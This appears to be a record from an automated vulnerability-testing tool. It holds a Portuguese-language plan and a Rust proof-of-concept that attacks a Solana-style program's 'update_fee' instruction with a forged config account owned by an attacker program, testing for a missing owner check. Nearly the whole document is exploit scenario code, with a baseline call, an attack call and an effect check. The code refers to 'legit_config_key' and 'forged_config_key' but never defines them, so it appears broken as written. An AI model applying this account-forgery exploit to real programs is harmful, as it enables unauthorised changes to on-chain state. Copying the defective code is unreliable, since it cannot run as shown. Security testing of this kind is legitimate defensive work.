attempts.raw:
{
  "plan": "O atacante cria uma conta forjada cujo owner é um programa malicioso (env.attacker_program) e cujos bytes 8..40 contêm a pubkey do atacante como admin. O baseline usa uma conta config legítima (owner = env.program_id) com o admin correto e a authority assinante, provando que o cenário está montado. O ataque passa a mesma authority assinante, mas a conta config forjada com owner diferente; se a instrução aceitar, ela escreverá o novo fee nos bytes 40..48 da conta forjada. O efeito mede que a conta forjada teve seus bytes 40..48 alterados para o novo fee, algo que o uso legítimo não faria na conta do atacante.",
  "scenario": "let attacker = Pubkey::new_unique();
let authority = Pubkey::new_unique();
let new_fee: u64 = 999_999;

// Conta config legitima: owner = programa, admin = authority
let mut legit_data = vec![0u8; 48];
legit_data[8..40].copy_from_slice(authority.as_ref());
let legit_config = account(&env.program_id, &legit_data, None);

// Conta config forjada: owner = programa do atacante, admin = authority
let mut forged_data = vec![0u8; 48];
forged_data[8..40].copy_from_slice(authority.as_ref());
let attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);
let forged_config = account(&attacker_program, &forged_data, None);

let authority_account = wallet(1_000_000_000);

// Baseline: uso legitimo com a conta config correta
let ix_baseline = env.raw_ix(
    &[IX_UPDATE_FEE, new_fee.to_le_bytes().as_ref()].concat(),
    &[
        AccountMeta::new(legit_config_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let r_base = env.baseline(
    "update_fee legitimo",
    &ix_baseline,
    &[
        (legit_config_key, legit_config.clone()),
        (authority, authority_account.clone()),
    ],
);

// Ataque: mesma authority, mas config forjada com owner diferente
let ix_attack = env.raw_ix(
    &[IX_UPDATE_FEE, new_fee.to_le_bytes().as_ref()].concat(),
    &[
        AccountMeta::new(forged_config_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let r_attack = env.attack(
    "update_fee com config forjada",
    &ix_attack,
    &[
        (forged_config_key, forged_config.clone()),
        (authority, authority_account.clone()),
    ],
);

if r_attack.program_result == ProgramResult::Success {
    let forged_after = after(&r_attack, &forged_config_key);
    env.effect(
        "fee escrito na conta forjada de outro owner",
        read_u64(forged_after.data(), 40) == new_fee,
    );
}"
}

